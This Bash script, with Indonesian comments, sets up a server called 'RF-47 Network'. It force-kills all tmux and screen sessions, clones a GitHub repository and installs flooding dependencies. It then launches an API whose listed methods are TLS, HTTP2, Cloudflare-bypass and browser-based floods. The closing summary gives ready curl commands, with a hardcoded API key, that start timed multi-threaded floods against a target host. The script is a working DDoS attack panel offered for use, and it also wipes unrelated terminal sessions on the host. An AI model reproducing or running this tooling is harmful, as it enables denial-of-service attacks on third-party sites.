#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Cek apakah SERVER_DOMAIN sudah di-set sebagai environment variable
if [ -z "$SERVER_DOMAIN" ]; then
    if [ -n "$1" ]; then
        SERVER_DOMAIN="$1"
    else
        echo -e "${RED}Usage: SERVER_DOMAIN=domain.com ./setup.sh${NC}"
        echo -e "${RED}Or: ./setup.sh domain.com${NC}"
        exit 1
    fi
fi

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}       RF-47 Network Setup Script       ${NC}"
echo -e "${GREEN}              Version 3.0                ${NC}"
echo -e "${GREEN}========================================${NC}"

# ==================== HAPUS SEMUA TMUX SESSION ====================
echo -e "${YELLOW}[0/13] Killing ALL tmux sessions...${NC}"

# Kill semua tmux session
if command -v tmux &> /dev/null; then
    echo -e "${YELLOW}Killing all tmux sessions...${NC}"
    
    # Matikan session spesifik rf47
    tmux kill-session -t rf47 2>/dev/null
    
    # Matikan semua session tmux
    tmux kill-server 2>/dev/null
    
    # Kill dengan pkill
    pkill -9 tmux 2>/dev/null
    killall -9 tmux 2>/dev/null
    
    # Hapus socket tmux
    rm -rf /tmp/tmux-* 2>/dev/null
    rm -rf /var/run/tmux/* 2>/dev/null
    
    echo -e "${GREEN}✓ All tmux sessions killed!${NC}"
else
    echo -e "${GREEN}tmux not installed, skipping...${NC}"
fi

# ==================== HAPUS SEMUA SCREEN SESSION (AGRESIF) ====================
echo -e "${YELLOW}[1/13] Killing ALL screen sessions (aggressive mode)...${NC}"

# Method 1: Kill semua screen process dengan pkill
if command -v pkill &> /dev/null; then
    echo -e "${YELLOW}Killing all screen processes with pkill...${NC}"
    pkill -9 screen 2>/dev/null
    pkill -9 SCREEN 2>/dev/null
fi

# Method 2: Kill dengan killall
if command -v killall &> /dev/null; then
    echo -e "${YELLOW}Killing all screen processes with killall...${NC}"
    killall -9 screen 2>/dev/null
    killall -9 SCREEN 2>/dev/null
fi

# Method 3: Hapus semua socket screen yang tersisa
echo -e "${YELLOW}Removing screen sockets...${NC}"
rm -rf /var/run/screen/* 2>/dev/null
rm -rf /tmp/screen* 2>/dev/null
rm -rf ~/.screen/* 2>/dev/null

# Method 4: Loop sampai benar-benar bersih (max 5 kali)
for i in {1..5}; do
    SESSION_COUNT=$(screen -ls 2>/dev/null | grep -c "\. [0-9]" || echo "0")
    if [ "$SESSION_COUNT" -eq 0 ]; then
        break
    fi
    echo -e "${YELLOW}Attempt $i: Found $SESSION_COUNT session(s), killing...${NC}"
    
    screen -ls | grep -E '[0-9]+\.' | cut -d. -f1 | awk '{print $1}' 2>/dev/null | while read session; do
        echo -e "${YELLOW}Killing screen session: $session${NC}"
        screen -S "$session" -X quit 2>/dev/null
        screen -S "$session" -X kill 2>/dev/null
    done
    
    screen -wipe 2>/dev/null
    sleep 1
done

# Method 5: Matikan session spesifik rf47
echo -e "${YELLOW}Killing specific session 'rf47'...${NC}"
screen -S rf47 -X quit 2>/dev/null
screen -S rf47 -X kill 2>/dev/null

# Verifikasi screen
echo -e "${YELLOW}Verifying no screen sessions left...${NC}"
REMAINING=$(screen -ls 2>/dev/null | grep -c "\. [0-9]" || echo "0")
if [ "$REMAINING" -eq 0 ]; then
    echo -e "${GREEN}✓ All screen sessions have been killed!${NC}"
else
    echo -e "${RED}⚠ Warning: $REMAINING screen session(s) still running${NC}"
    # Force kill dengan PID
    screen -ls | grep -E '[0-9]+\.' | while read line; do
        PID=$(echo "$line" | awk '{print $1}' | cut -d. -f1)
        if [ -n "$PID" ]; then
            echo -e "${RED}Force killing PID: $PID${NC}"
            kill -9 "$PID" 2>/dev/null
        fi
    done
fi

echo -e "${GREEN}Cleanup completed!${NC}"

# ==================== UPDATE SYSTEM ====================
echo -e "${YELLOW}[2/13] Updating system packages...${NC}"
apt update -y && apt upgrade -y

# ==================== INSTALL DEPENDENCIES ====================
echo -e "${YELLOW}[3/13] Installing Node.js and npm...${NC}"
apt install nodejs npm -y

echo -e "${YELLOW}[4/13] Installing screen...${NC}"
apt install screen -y

echo -e "${YELLOW}[5/13] Installing git...${NC}"
apt install git -y

echo -e "${YELLOW}[6/13] Installing wget and curl...${NC}"
apt install wget curl -y

# ==================== HAPUS TMUX (PASTIKAN TIDAK TERINSTALL) ====================
echo -e "${YELLOW}[7/13] Removing tmux package if exists...${NC}"
if command -v tmux &> /dev/null; then
    echo -e "${YELLOW}Removing tmux...${NC}"
    apt remove tmux -y 2>/dev/null
    apt purge tmux -y 2>/dev/null
    apt autoremove -y 2>/dev/null
    echo -e "${GREEN}✓ tmux removed!${NC}"
else
    echo -e "${GREEN}tmux not installed, skipping...${NC}"
fi

# ==================== CHECK NODE VERSION ====================
echo -e "${YELLOW}[8/13] Checking Node.js version...${NC}"
NODE_VERSION=$(node -v)
echo -e "${GREEN}Node.js version: ${NODE_VERSION}${NC}"

# ==================== STOP SCREEN SESSION LAMA LAGI (PASTIKAN MATI) ====================
echo -e "${YELLOW}Ensuring all screen sessions are killed (second pass)...${NC}"

# Kill lagi setelah screen terinstall
pkill -9 screen 2>/dev/null
killall -9 screen 2>/dev/null

screen -ls | grep -E '[0-9]+\.' | cut -d. -f1 | awk '{print $1}' 2>/dev/null | while read session; do
    echo -e "${YELLOW}Killing screen session: $session${NC}"
    screen -S "$session" -X quit 2>/dev/null
done

screen -S rf47 -X quit 2>/dev/null
screen -wipe 2>/dev/null

# Bersihkan socket lagi
rm -rf /var/run/screen/* 2>/dev/null
rm -rf /tmp/screen* 2>/dev/null

echo -e "${GREEN}All screen sessions cleaned!${NC}"

# ==================== CLONE FROM GITHUB ====================
echo -e "${YELLOW}[9/13] Cloning from GitHub...${NC}"

if [ -d "this-is-a-hub-nah" ]; then
    echo -e "${YELLOW}Directory this-is-a-hub-nah already exists, updating...${NC}"
    cd this-is-a-hub-nah
    git pull
    cd ..
else
    echo -e "${YELLOW}Cloning repository...${NC}"
    git clone https://github.com/raflyprasetya/this-is-a-hub-nah.git
fi

if [ ! -d "this-is-a-hub-nah" ]; then
    echo -e "${RED}Failed to clone repository from GitHub!${NC}"
    exit 1
fi

echo -e "${GREEN}Clone completed!${NC}"

# ==================== NAVIGATE TO DIRECTORY ====================
cd this-is-a-hub-nah

# ==================== CREATE SCRIPTS DIRECTORY ====================
echo -e "${YELLOW}[10/13] Creating scripts directory...${NC}"
mkdir -p scripts

# ==================== CLEAN NODE_MODULES (if exists) ====================
if [ -d "node_modules" ]; then
    echo -e "${YELLOW}Removing old node_modules...${NC}"
    rm -rf node_modules package-lock.json
fi

# ==================== INSTALL NPM PACKAGES ====================
echo -e "${YELLOW}[11/13] Installing npm dependencies...${NC}"

npm install express randomstring user-agents axios commander hpack request --silent

if [ $? -ne 0 ]; then
    echo -e "${RED}Failed to install npm dependencies!${NC}"
    echo -e "${YELLOW}Retrying with force...${NC}"
    npm install express randomstring user-agents axios commander hpack request --force
fi

echo -e "${YELLOW}Verifying installations...${NC}"
if npm list express randomstring user-agents axios commander hpack request --depth=0 &>/dev/null; then
    echo -e "${GREEN}All dependencies installed successfully!${NC}"
else
    echo -e "${RED}Some dependencies may be missing. Installing one by one...${NC}"
    npm install express
    npm install randomstring
    npm install user-agents
    npm install axios
    npm install commander
    npm install hpack
    npm install request
fi

echo -e "${GREEN}NPM dependencies installed!${NC}"

# ==================== CREATE DEFAULT FILES ====================
echo -e "${YELLOW}[12/13] Creating default configuration files...${NC}"

if [ ! -f "scripts/proxy.txt" ]; then
    touch scripts/proxy.txt
    echo -e "${GREEN}Created empty proxy.txt${NC}"
else
    echo -e "${GREEN}proxy.txt already exists${NC}"
fi

if [ ! -f "scripts/ua.txt" ]; then
    cat > scripts/ua.txt << 'EOF'
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
EOF
    echo -e "${GREEN}Created default ua.txt with 10 user-agents${NC}"
else
    echo -e "${GREEN}ua.txt already exists${NC}"
fi

# ==================== CONFIGURE SERVER ====================
echo -e ""
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}       Server Configuration             ${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e ""
echo -e "${GREEN}Using server domain: ${SERVER_DOMAIN}${NC}"

# ==================== DEFAULT VALUES ====================
GAS_URL="https://script.google.com/macros/s/AKfycbxavnz3eaPAy3CwIUsM4bsv3JFhhi4rwGCT3f1VDKoLl7MjaA9_jj7YrKfGeIvjgSLRsA/exec"
PING_ENABLED="true"
SERVER_PORT="3000"

echo -e "${GREEN}Using default GAS URL${NC}"
echo -e "${GREEN}Auto ping enabled: ${PING_ENABLED}${NC}"

# ==================== SAVE CONFIGURATION ====================
echo -e ""
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}       Saving Configuration            ${NC}"
echo -e "${GREEN}========================================${NC}"

cat > config.json << EOF
{
    "server_domain": "${SERVER_DOMAIN}",
    "server_port": ${SERVER_PORT},
    "ping_enabled": ${PING_ENABLED},
    "ping_interval": 30000,
    "gas_url": "${GAS_URL}"
}
EOF

echo -e "${GREEN}Configuration saved to config.json${NC}"

# ==================== CHECK SCRIPT FILES ====================
echo -e ""
echo -e "${YELLOW}Checking script files...${NC}"

if [ -f "server.js" ]; then
    echo -e "${GREEN}✓ server.js found${NC}"
else
    echo -e "${RED}✗ server.js not found!${NC}"
    exit 1
fi

if [ -f "scripts/TLS.js" ]; then
    echo -e "${GREEN}✓ scripts/TLS.js found${NC}"
else
    echo -e "${YELLOW}⚠ scripts/TLS.js not found (optional)${NC}"
fi

if [ -f "scripts/TLSV2.js" ]; then
    echo -e "${GREEN}✓ scripts/TLSV2.js found${NC}"
else
    echo -e "${YELLOW}⚠ scripts/TLSV2.js not found (optional)${NC}"
fi

if [ -f "scripts/CF-BYPASS.js" ]; then
    echo -e "${GREEN}✓ scripts/CF-BYPASS.js found${NC}"
else
    echo -e "${YELLOW}⚠ scripts/CF-BYPASS.js not found (optional)${NC}"
fi

if [ -f "scripts/Browser.js" ]; then
    echo -e "${GREEN}✓ scripts/Browser.js found${NC}"
else
    echo -e "${YELLOW}⚠ scripts/Browser.js not found (optional)${NC}"
fi

# ==================== PASTIKAN TIDAK ADA SCREEN ATAU TMUX SEBELUM START ====================
echo -e "${YELLOW}Final cleanup before starting (third pass)...${NC}"

# Kill all screen processes
pkill -9 screen 2>/dev/null
killall -9 screen 2>/dev/null

# Kill all tmux processes (just in case)
pkill -9 tmux 2>/dev/null
killall -9 tmux 2>/dev/null

# Loop until no screen sessions left
MAX_ITER=10
for i in $(seq 1 $MAX_ITER); do
    SESSION_COUNT=$(screen -ls 2>/dev/null | grep -c "\. [0-9]" || echo "0")
    if [ "$SESSION_COUNT" -eq 0 ]; then
        echo -e "${GREEN}✓ No screen sessions found (iteration $i)${NC}"
        break
    fi
    echo -e "${YELLOW}Iteration $i: $SESSION_COUNT session(s) remain, killing...${NC}"
    
    screen -ls | grep -E '[0-9]+\.' | cut -d. -f1 | awk '{print $1}' 2>/dev/null | while read session; do
        screen -S "$session" -X quit 2>/dev/null
        screen -S "$session" -X kill 2>/dev/null
    done
    
    screen -wipe 2>/dev/null
    sleep 1
done

# Bersihkan socket screen dan tmux
rm -rf /var/run/screen/* 2>/dev/null
rm -rf /tmp/screen* 2>/dev/null
rm -rf /tmp/tmux-* 2>/dev/null

echo -e "${GREEN}All screen and tmux sessions killed! Ready to start fresh.${NC}"

# ==================== START SERVER WITH SCREEN ====================
echo -e ""
echo -e "${YELLOW}[13/13] Starting server with screen...${NC}"

# Create new screen session and run server
screen -dmS rf47 bash -c "node server.js"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}Server started in screen session: rf47${NC}"
else
    echo -e "${RED}Failed to start server!${NC}"
    exit 1
fi

# ==================== DISPLAY SUMMARY ====================
echo -e ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}       Setup Completed Successfully!     ${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e ""
echo -e "${BLUE}Configuration:${NC}"
echo -e "  ${YELLOW}Server Domain:${NC} ${SERVER_DOMAIN}"
echo -e "  ${YELLOW}Server Port:${NC} ${SERVER_PORT}"
echo -e "  ${YELLOW}Ping Enabled:${NC} ${PING_ENABLED} (auto)"
echo -e "  ${YELLOW}Ping Interval:${NC} 30 seconds"
echo -e "  ${YELLOW}Ping URL:${NC} https://${SERVER_DOMAIN}"
echo -e "  ${YELLOW}GAS URL:${NC} ${GAS_URL} (default)"
echo -e ""
echo -e "${BLUE}Available Methods:${NC}"
echo -e "  ${GREEN}● tls${NC}     - TCP/TLS Flood via HTTP/HTTPS/SOCKS proxy"
echo -e "  ${GREEN}● tlsv2${NC}   - HTTP2 Flood with stable auto-reconnect"
echo -e "  ${GREEN}● cf${NC}      - Cloudflare Bypass HTTP2 Flood"
echo -e "  ${GREEN}● fast${NC}    - H2-FAST Advanced HTTP2 Flood with AI Fingerprint"
echo -e "  ${GREEN}● browser${NC} - Browser Engine - Real browser simulation"
echo -e ""
echo -e "${BLUE}Commands:${NC}"
echo -e "  ${YELLOW}screen -r rf47${NC}               - Attach to server session"
echo -e "  ${YELLOW}Ctrl+A then D${NC}                - Detach from screen session"
echo -e "  ${YELLOW}screen -S rf47 -X quit${NC}       - Stop the server"
echo -e "  ${YELLOW}screen -ls${NC}                   - List all screen sessions"
echo -e "  ${YELLOW}cat config.json${NC}              - View configuration"
echo -e "  ${YELLOW}npm list --depth=0${NC}           - List installed packages"
echo -e ""
echo -e "${BLUE}API Examples:${NC}"
echo -e "  ${YELLOW}# TLS Method${NC}"
echo -e "  curl \"http://localhost:3000/api?api_key=rfpromax1337&ip=example.com&method=tls&port=443&time=30&threads=50\""
echo -e ""
echo -e "  ${YELLOW}# TLSV2 Method${NC}"
echo -e "  curl \"http://localhost:3000/api?api_key=rfpromax1337&ip=example.com&method=tlsv2&port=443&time=30&threads=10\""
echo -e ""
echo -e "  ${YELLOW}# CF Method${NC}"
echo -e "  curl \"http://localhost:3000/api?api_key=rfpromax1337&ip=example.com&method=cf&port=443&time=30&threads=10\""
echo -e ""
echo -e "  ${YELLOW}# FAST Method${NC}"
echo -e "  curl \"http://localhost:3000/api?api_key=rfpromax1337&ip=example.com&method=fast&port=443&time=30&threads=10&rate=100&connections=10&streams=10&fingerprint=true&extra=true\""
echo -e ""
echo -e "  ${YELLOW}# BROWSER Method${NC}"
echo -e "  curl \"http://localhost:3000/api?api_key=rfpromax1337&ip=example.com&method=browser&port=443&time=30&threads=10&browser_count=5&conn_timeout=30000&rps=10\""
echo -e ""
echo -e "${GREEN}========================================${NC}"
